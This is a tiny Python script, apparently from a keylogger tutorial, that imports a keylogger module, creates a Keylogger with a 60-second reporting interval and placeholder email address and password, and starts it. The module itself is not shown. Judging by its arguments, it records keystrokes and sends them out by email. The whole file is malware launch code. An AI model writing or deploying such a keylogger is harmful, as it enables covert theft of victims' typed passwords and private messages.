#!/usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(60, "Email Address", "Email Password")
my_keylogger.start()